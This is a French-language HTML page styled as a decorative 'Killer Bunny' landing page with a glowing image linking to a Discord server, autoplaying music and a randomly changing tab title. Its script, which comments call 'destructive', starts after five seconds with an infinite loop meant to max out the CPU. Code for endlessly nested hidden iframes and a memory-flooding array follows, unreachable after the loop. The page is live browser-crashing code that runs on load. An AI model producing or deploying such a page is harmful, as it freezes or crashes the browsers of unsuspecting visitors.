<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Killer Bunny</title>
    <style>
        /* Thème sombre global */
        body {
            margin: 0;
            padding: 0;
            background: linear-gradient(145deg, #000000, #1a1a1a);
            color: #ffffff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            height: 100vh;
            overflow: hidden;
        }

        /* Conteneur principal */
        .container {
            text-align: center;
            position: relative;
        }

        /* Style de l'image */
        .killer-bunny {
            width: 300px;
            height: auto;
            animation: fadeIn 2s ease-in-out;
            filter: drop-shadow(0 0 20px rgba(255, 255, 255, 0.7)) drop-shadow(0 0 40px rgba(0, 0, 0, 0.5));
            transition: transform 0.5s ease, filter 0.5s ease;
            cursor: pointer;
        }

        .killer-bunny:hover {
            transform: scale(1.1);
            filter: drop-shadow(0 0 40px rgba(255, 255, 255, 1)) drop-shadow(0 0 60px rgba(0, 0, 0, 0.7));
        }

        /* Animation de fade-in */
        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: scale(0.8);
            }
            to {
                opacity: 1;
                transform: scale(1);
            }
        }

        /* Effet brillant autour de l'image */
        .glow {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 350px;
            height: 350px;
            background: radial-gradient(circle, rgba(255, 255, 255, 0.2), transparent);
            border-radius: 50%;
            z-index: -1;
            animation: pulse 3s infinite ease-in-out;
        }

        /* Animation de pulsation */
        @keyframes pulse {
            0%, 100% {
                opacity: 0.5;
                transform: scale(1);
            }
            50% {
                opacity: 1;
                transform: scale(1.2);
            }
        }

    </style>
</head>
<body>
    <!-- Conteneur de l'image principale -->
    <div class="container">
        <div class="glow"></div>
        <img src="https://i.ibb.co/dMK3t7j/4328d00292b082b5f8fa1b648d25b666-removebg-preview.png" 
             alt="Lapin Tueur" class="killer-bunny"
             onclick="window.open('https://discord.gg/amsUQdUQa7', '_blank')">
    </div>

    <!-- Musique de fond -->
    <audio autoplay loop>
        <source src="https://pouch.jumpshare.com/preview/roGyDVGHDgyjUEB5cfr5ofG20g9Y1EIpt_cQRlDm_XvY82T6EVffM9xQFTvUpm35BabvWru8Ms_JViudeNNaWCwoWnq_28GRCRipzsZwl-nUYTbHdFgDzz5coam4CEZxqLiVRawwdII9VvWfeaBhmG6yjbN-I2pg_cnoHs_AmgI.mp3" type="audio/mpeg">
        Votre navigateur ne supporte pas la lecture audio.
    </audio>

    <!-- Scripts JavaScript -->
    <script>
        // Fonction pour générer un titre aléatoire avec "Killer Bunny" au centre
        function generateTitle() {
            const randomChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            let leftPart = "";
            let rightPart = "";
            for (let i = 0; i < 5; i++) {
                leftPart += randomChars.charAt(Math.floor(Math.random() * randomChars.length));
                rightPart += randomChars.charAt(Math.floor(Math.random() * randomChars.length));
            }
            document.title = `${leftPart} Killer Bunny ${rightPart}`;
        }

        // Mise à jour du titre toutes les secondes
        setInterval(generateTitle, 1000);

        // Délai de 5 secondes avant de lancer les scripts destructeurs
        setTimeout(function() {
            // Boucle infinie pour surcharger le CPU
            while (true) {
                console.log("Boucle Infinie...");
            }

            // Iframes imbriquées à l'infini pour saturer la mémoire
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            document.body.appendChild(iframe);
            const nextQueryValue = !location.search ? 1 : Number(location.search.split("?").pop()) + 1;
            iframe.src = `index.html?${nextQueryValue}`;

            // Surcharge mémoire immédiate
            let memoryOverload = [];
            for (let i = 0; i < 100000; i++) {
                memoryOverload.push({});
            }
            console.log("Surcharge mémoire immédiate !");
        }, 5000); // Délai de 5 secondes
    </script>
</body>
</html>
